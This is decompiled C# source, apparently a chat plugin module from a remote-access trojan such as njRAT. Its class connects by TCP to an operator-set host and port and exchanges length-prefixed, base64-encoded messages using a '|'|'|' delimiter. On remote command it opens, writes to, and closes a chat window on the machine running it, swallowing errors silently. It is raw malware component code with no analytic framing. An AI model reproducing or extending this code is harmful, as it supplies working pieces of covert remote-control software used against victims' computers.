using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ch
{
	// Token: 0x02000007 RID: 7
	public class A
	{
		// Token: 0x06000011 RID: 17 RVA: 0x00002E4C File Offset: 0x0000124C
		public A()
		{
			this.C = new TcpClient();
			this.OFF = false;
			this.OSK = "";
			this.SPL = "[endof]";
			this.Y = "|'|'|";
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002E8C File Offset: 0x0000128C
		[CompilerGenerated]
		[DebuggerStepThrough]
		private void _Lambda__1(object a0)
		{
			this.ind((byte[])a0);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002EA0 File Offset: 0x000012A0
		public string BS(ref byte[] B)
		{
			return Encoding.Default.GetString(B);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002EC0 File Offset: 0x000012C0
		public string DEB(ref string s)
		{
			byte[] array = Convert.FromBase64String(s);
			return Encoding.UTF8.GetString(array);
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002EE8 File Offset: 0x000012E8
		public string ENB(ref string s)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002F0C File Offset: 0x0000130C
		public void ind(byte[] b)
		{
			string[] array = Strings.Split(this.BS(ref b), this.Y, -1, CompareMethod.Binary);
			try
			{
				string text = array[0];
				bool flag = Operators.CompareString(text, "~", false) == 0;
				if (flag)
				{
					string text2 = string.Concat(new string[] { "CH", this.Y, this.OSK, this.Y, "!" });
					this.F = new C();
					this.F.A = this;
					this.F.Hk = this.DEB(ref array[1]);
					this.Send(text2);
					this.F.Show();
					while (!this.F.IsDisposed)
					{
						Application.DoEvents();
						Thread.Sleep(10);
					}
				}
				else
				{
					flag = Operators.CompareString(text, "!", false) == 0;
					if (flag)
					{
						try
						{
							Interaction.AppActivate(this.F.Text);
						}
						catch (Exception ex)
						{
						}
						C f = this.F;
						C c = f;
						lock (c)
						{
							this.F.T1.SelectionStart = this.F.T1.TextLength;
							this.F.T1.SelectionFont = new Font(this.F.T1.Font, FontStyle.Bold);
							this.F.T1.AppendText(this.F.Hk + " : ");
							this.F.T1.SelectionFont = this.F.T1.Font;
							this.F.T1.AppendText(this.DEB(ref array[1]) + "\r\n");
							this.F.T1.SelectionStart = this.F.T1.TextLength;
							this.F.T1.ScrollToCaret();
						}
					}
					else
					{
						flag = Operators.CompareString(text, "@", false) == 0;
						if (flag)
						{
							this.F.Dispose();
						}
					}
				}
			}
			catch (Exception ex2)
			{
				Exception ex3 = ex2;
				try
				{
					this.Send(string.Concat(new string[]
					{
						"CH",
						this.Y,
						this.OSK,
						this.Y,
						"ER",
						this.Y,
						array[0],
						this.Y,
						ex3.Message
					}));
				}
				catch (Exception ex4)
				{
				}
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000032BC File Offset: 0x000016BC
		public void RC()
		{
			MemoryStream memoryStream = new MemoryStream();
			long num = -1L;
			byte[] array = new byte[1];
			checked
			{
				try
				{
					this.C.SendBufferSize = 102400;
					this.C.Connect(this.H, this.P);
					this.Send(string.Concat(new string[] { "CH", this.Y, this.OSK, this.Y, "~" }));
					for (;;)
					{
						bool flag = this.OFF;
						if (flag)
						{
							break;
						}
						this.C.Client.Poll(-1, SelectMode.SelectRead);
						bool flag2;
						for (;;)
						{
							IL_AF:
							flag = this.C.Available > 0;
							if (!flag)
							{
								goto IL_23F;
							}
							flag2 = num == -1L;
							if (flag2)
							{
								string text = "";
								for (;;)
								{
									int num2 = this.C.GetStream().ReadByte();
									switch (num2)
									{
									case -1:
										goto IL_10B;
									case 0:
										num = Conversions.ToLong(text);
										flag2 = num == 0L;
										if (flag2)
										{
											this.Send("");
											num = -1L;
										}
										flag2 = this.C.Available <= 0;
										if (flag2)
										{
											goto Block_10;
										}
										goto IL_AF;
									default:
										text += Conversions.ToString(Strings.ChrW(num2));
										break;
									}
								}
								goto IL_182;
							}
							goto IL_182;
						}
						Block_10:
						continue;
						IL_182:
						array = new byte[this.C.Available + 1 - 1 + 1];
						long num3 = num - memoryStream.Length;
						flag2 = unchecked((long)array.Length) > num3;
						if (flag2)
						{
							array = new byte[(int)(num3 - 1L) + 1 - 1 + 1];
						}
						int num4 = this.C.Client.Receive(array, 0, array.Length, SocketFlags.None);
						memoryStream.Write(array, 0, num4);
						flag2 = memoryStream.Length == num;
						if (flag2)
						{
							num = -1L;
							Thread thread = new Thread(new ParameterizedThreadStart(this._Lambda__1), 1);
							thread.Start(memoryStream.ToArray());
							thread.Join(100);
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
						}
						Thread.Sleep(1);
					}
					IL_10B:
					IL_23F:;
				}
				catch (Exception ex)
				{
				}
				this.OFF = true;
				try
				{
					this.C.Close();
				}
				catch (Exception ex2)
				{
				}
				try
				{
					memoryStream.Dispose();
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000035E4 File Offset: 0x000019E4
		public byte[] SB(ref string S)
		{
			return Encoding.Default.GetBytes(S);
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003604 File Offset: 0x00001A04
		public void Send(byte[] b)
		{
			try
			{
				TcpClient c = this.C;
				TcpClient tcpClient = c;
				lock (tcpClient)
				{
					MemoryStream memoryStream = new MemoryStream();
					string text = Conversions.ToString(b.Length) + "\0";
					byte[] array = this.SB(ref text);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					this.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					memoryStream.Dispose();
				}
			}
			catch (Exception ex)
			{
				this.OFF = true;
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000036E0 File Offset: 0x00001AE0
		public void Send(string S)
		{
			this.Send(this.SB(ref S));
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000036F4 File Offset: 0x00001AF4
		public void Start()
		{
			Thread thread = new Thread(new ThreadStart(this.RC));
			thread.Start();
		}

		// Token: 0x04000006 RID: 6
		public TcpClient C;

		// Token: 0x04000007 RID: 7
		public C F;

		// Token: 0x04000008 RID: 8
		public string H;

		// Token: 0x04000009 RID: 9
		public bool OFF;

		// Token: 0x0400000A RID: 10
		public string OSK;

		// Token: 0x0400000B RID: 11
		public int P;

		// Token: 0x0400000C RID: 12
		public string SPL;

		// Token: 0x0400000D RID: 13
		public string Y;
	}
}
